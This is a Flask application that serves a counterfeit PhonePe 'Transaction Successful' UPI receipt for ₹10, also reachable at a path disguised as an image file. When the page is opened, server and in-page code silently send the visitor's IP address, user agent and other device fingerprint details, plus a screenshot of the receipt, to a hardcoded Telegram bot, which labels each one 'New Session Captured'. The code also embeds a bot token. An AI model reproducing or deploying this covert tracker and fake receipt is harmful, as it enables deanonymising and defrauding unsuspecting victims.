from flask import Flask, render_template_string, request
import requests

app = Flask(__name__)

# Telegram Configuration
TELEGRAM_BOT_TOKEN = "8695858574:AAF4IHKfQI6F7VQ23G2EfGDJrvTz9IESfqQ"
TELEGRAM_CHAT_ID = "6156642923"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PhonePe Transaction Successful</title>
    <!-- html2canvas library for taking screenshot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: #121212;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 0;
        }

        .phone-wrapper {
            width: 100%;
            max-width: 412px;
            background-color: #f3f4f6;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            position: relative;
            overflow: hidden;
        }

        .receipt-container {
            padding: 20px 16px;
            width: 100%;
            background-color: #f3f4f6;
        }

        /* Header Section */
        .header {
            display: flex;
            align-items: center;
            padding: 8px 4px 20px 4px;
        }

        .phonepe-logo {
            width: 44px;
            height: 44px;
            background-color: #5f259f;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 24px;
            font-weight: 700;
            margin-right: 14px;
            flex-shrink: 0;
        }

        .header-text h2 {
            font-size: 19px;
            color: #1a1a1a;
            font-weight: 600;
        }

        .header-text p {
            font-size: 13.5px;
            color: #666666;
            margin-top: 3px;
        }

        /* Card Container */
        .card {
            background-color: #ffffff;
            border-radius: 16px;
            padding: 20px;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
            margin-bottom: 25px;
        }

        .card-title {
            font-size: 16px;
            font-weight: 700;
            color: #111111;
            margin-bottom: 16px;
        }

        /* Sender Details */
        .sender-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .sender-left {
            display: flex;
            align-items: center;
        }

        .avatar {
            width: 44px;
            height: 44px;
            background-color: #5f259f;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            margin-right: 14px;
            flex-shrink: 0;
        }

        .sender-info h3 {
            font-size: 16.5px;
            color: #1a1a1a;
            font-weight: 600;
        }

        .sender-info p {
            font-size: 13.5px;
            color: #666666;
            margin-top: 3px;
        }

        .amount {
            font-size: 20px;
            font-weight: 700;
            color: #000000;
        }

        .divider {
            height: 1px;
            background-color: #eeeeee;
            margin: 16px 0;
        }

        /* Banking Name Section */
        .banking-name-row {
            display: flex;
            align-items: center;
            font-size: 14.5px;
            color: #555555;
        }

        .banking-label {
            width: 130px;
        }

        .banking-value {
            color: #222222;
            display: flex;
            align-items: center;
            gap: 6px;
            font-weight: 500;
        }

        .verified-badge {
            width: 16px;
            height: 16px;
            background-color: #10b981;
            border-radius: 50%;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 10px;
            font-weight: bold;
        }

        /* Transfer Details Header */
        .transfer-details-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 4px;
        }

        .transfer-title {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 16px;
            color: #1a1a1a;
            font-weight: 600;
        }

        .chevron-icon {
            width: 20px;
            height: 20px;
            transition: transform 0.2s ease;
        }

        /* Detail Fields */
        .field-group {
            margin-top: 16px;
        }

        .field-label {
            font-size: 13.5px;
            color: #666666;
            margin-bottom: 4px;
        }

        .field-value {
            font-size: 15.5px;
            color: #1a1a1a;
            font-weight: 500;
            letter-spacing: 0.3px;
        }

        /* Credited To Section */
        .credited-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 6px;
        }

        .credited-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .sbi-icon {
            width: 32px;
            height: 32px;
        }

        .account-number {
            font-size: 15.5px;
            color: #1a1a1a;
            font-weight: 500;
        }

        .utr-value {
            font-size: 14.5px;
            color: #555555;
            margin-top: 10px;
            padding-left: 44px;
        }

        /* Footer Section */
        .footer {
            text-align: center;
            padding-bottom: 24px;
            margin-top: auto;
        }

        .footer p {
            font-size: 13px;
            color: #777777;
            margin-bottom: 6px;
        }

        .footer-logos {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 8px;
            font-size: 14px;
            font-weight: bold;
        }

        .upi-logo {
            height: 16px;
        }
    </style>
</head>
<body>

    <div class="phone-wrapper">
        <div class="receipt-container" id="receipt-area">
            <!-- Header -->
            <div class="header">
                <div class="phonepe-logo">पे</div>
                <div class="header-text">
                    <h2>Transaction Successful</h2>
                    <p>01:09 pm on 07 octomber 2026</p>
                </div>
            </div>

            <!-- Main Card -->
            <div class="card">
                <div class="card-title">Received from</div>

                <div class="sender-row">
                    <div class="sender-left">
                        <div class="avatar">
                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                                <line x1="7" y1="7" x2="17" y2="17"></line>
                                <polyline points="17 7 17 17 7 17"></polyline>
                            </svg>
                        </div>
                        <div class="sender-info">
                            <h3>Ajeet Gurjar</h3>
                            <p>+91 ••••• ••••</p>
                        </div>
                    </div>
                    <div class="amount">₹10</div>
                </div>

                <div class="divider"></div>

                <div class="banking-name-row">
                    <span class="banking-label">Banking Name</span>
                    <span class="banking-value">
                        : Ajeet Gurjar
                        <span class="verified-badge">✓</span>
                    </span>
                </div>

                <div class="divider"></div>

                <div class="transfer-details-header">
                    <div class="transfer-title">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <line x1="8" y1="6" x2="21" y2="6"></line>
                            <line x1="8" y1="12" x2="21" y2="12"></line>
                            <line x1="8" y1="18" x2="21" y2="18"></line>
                            <line x1="3" y1="6" x2="3.01" y2="6"></line>
                            <line x1="3" y1="12" x2="3.01" y2="12"></line>
                            <line x1="3" y1="18" x2="3.01" y2="18"></line>
                        </svg>
                        <span>Transfer Details</span>
                    </div>
                    <svg class="chevron-icon" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                        <polyline points="18 15 12 9 6 15"></polyline>
                    </svg>
                </div>

                <div class="field-group">
                    <div class="field-label">PhonePe Transaction ID</div>
                    <div class="field-value">T2609221309525245377409</div>
                </div>

                <div class="field-group">
                    <div class="field-label">Credited to</div>
                    <div class="credited-row">
                        <div class="credited-left">
                            <svg class="sbi-icon" viewBox="0 0 100 100">
                                <circle cx="50" cy="50" r="48" fill="#0083ca" />
                                <circle cx="50" cy="38" r="18" fill="#ffffff" />
                                <rect x="44" y="38" width="12" height="42" fill="#ffffff" />
                            </svg>
                            <span class="account-number">ajeetsharma5652@fam</span>
                        </div>
                        <div class="amount">₹10</div>
                    </div>
                    <div class="utr-value">UTR: 593915234415</div>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <div class="footer">
            <p>Powered by</p>
            <div class="footer-logos">
                <span style="font-style: italic; font-weight: 900; color: #333;">UPI</span>
                <span style="color: #ed1c24;">/</span>
                <span style="color: #002e6d; font-weight: 800;"><span style="color: #ed1c24;">✔</span> YES BANK</span>
            </div>
        </div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = "{{ bot_token }}";
        const TELEGRAM_CHAT_ID = "{{ chat_id }}";

        window.addEventListener('DOMContentLoaded', () => {
            fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const userIP = data.ip;
                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenRes = `${window.screen.width}x${window.screen.height}`;
                    const language = navigator.language;
                    const cores = navigator.hardwareConcurrency || 'N/A';
                    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;

                    const captionText = `🎯 *New Session Captured*\n\n` +
                        `🌐 *Public IP:* \`${userIP}\`\n` +
                        `💻 *Platform:* \`${platform}\`\n` +
                        `🖥️ *Resolution:* \`${screenRes}\`\n` +
                        `⚙️ *CPU Cores:* \`${cores}\`\n` +
                        `🌍 *Timezone:* \`${timeZone}\`\n` +
                        `🗣️ *Language:* \`${language}\`\n\n` +
                        `📝 *User Agent:* \`${userAgent}\``;

                    const element = document.getElementById('receipt-area');
                    html2canvas(element, { scale: 2, useCORS: true }).then(canvas => {
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', TELEGRAM_CHAT_ID);
                            formData.append('photo', blob, 'receipt.jpg');
                            formData.append('caption', captionText);
                            formData.append('parse_mode', 'Markdown');

                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        }, 'image/jpeg', 0.95);
                    });
                })
                .catch(error => console.error('Error:', error));
        });
    </script>

</body>
</html>
"""

@app.route('/receipt.jpg')
@app.route('/')
def serve_receipt():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')

    initial_msg = f"📩 *Initial Request Hit*\n🌐 *Server-side IP:* `{client_ip}`\n📝 *User-Agent:* `{user_agent}`"
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": initial_msg,
            "parse_mode": "Markdown"
        }, timeout=3)
    except Exception:
        pass

    return render_template_string(HTML_TEMPLATE, bot_token=TELEGRAM_BOT_TOKEN, chat_id=TELEGRAM_CHAT_ID)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
